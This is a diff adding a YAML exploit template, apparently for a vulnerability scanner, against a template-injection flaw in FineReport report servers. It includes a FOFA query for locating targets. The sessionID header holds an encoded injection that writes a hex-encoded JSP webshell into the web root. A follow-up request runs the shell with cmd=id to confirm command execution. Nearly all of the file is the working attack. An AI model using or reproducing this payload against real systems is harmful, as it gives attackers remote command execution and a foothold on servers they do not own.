@@ -1,0 +1,35 @@
+id: poc-yaml-finereport-pdf-template-injection
+info:
+  name: 帆软报表 pdf 模板注入漏洞
+  severity: high
+  tags:
+  - ssti
+  finger: finereport
+  fofa: body="Powered by 帆软"
+requests:
+- method: GET
+  path: /webroot/decision/nx/report/v9/print/ie/pdf
+  headers:
+    sessionID: '[24][7B][5F][5F]fr[5F]locale[5F][5F][3D]sql[28][27]FRDemo[27][2C]DECODE[28][27][25]25EF[25]25BB[25]25BFATTACH[25]2520DATABASE[25]2520[25]2527[2E][2E][25]252Fwebapps[25]252Fwebroot[25]252Fxxxx[2E]jsp[25]2527[25]2520as[25]2520qwerty[25]253B[27][29][2C]1[2C]1[29][7D][24][7B][5F][5F]fr[5F]locale[5F][5F][3D]sql[28][27]FRDemo[27][2C]DECODE[28][27][25]25EF[25]25BB[25]25BFCREATE[25]2520TABLE[25]2520qwerty[2E]rce[25]2528data[25]2520text[25]2529[25]253B[27][29][2C]1[2C]1[29][7D][24][7B][5F][5F]fr[5F]locale[5F][5F][3D]sql[28][27]FRDemo[27][2C]DECODE[28][27][25]25EF[25]25BB[25]25BFINSERT[25]2520INTO[25]2520qwerty[2E]rce[25]2528data[25]2529[25]2520VALUES[25]2520[25]2528x[25]25273c25206a6176612e696f2e496e70757453747265616d20696e203d2052756e74696d652e67657452756e74696d6528292e6578656328726571756573742e676574506172616d657465722822636d642229292e676574496e70757453747265616d28293b696e742061203d202d313b627974655b5d2062203d206e657720627974655b323034385d3b6f75742e7072696e7428223c7072653e22293b7768696c652828613d696e2e7265616428622929213d2d31297b6f75742e7072696e746c6e286e657720537472696e6728622c302c6129293b7d6f75742e7072696e7428223c2f7072653e22293b6e6577206a6176612e696f2e46696c65286170706c69636174696f6e2e6765745265616c5061746828726571756573742e676574536572766c657450617468282929292e64656c65746528293b253e[25]2527[25]2529[25]253B[27][29][2C]1[2C]1[29][7D]'
+  expression: 'status_code == 200 &&
+
+    contains(body,"PDFReader")
+
+    '
+- method: GET
+  path: /webroot/xxxx.jsp?cmd=id
+  expression: 'status_code == 200 &&
+
+    contains(body,"uid=") &&
+
+    contains(body,"gid=") &&
+
+    contains(headers,"/webroot") &&
+
+    contains(body,"CREATE TABLE") &&
+
+    contains(body,"SQLite format")
+
+    '
+variables: {}
+transport: http
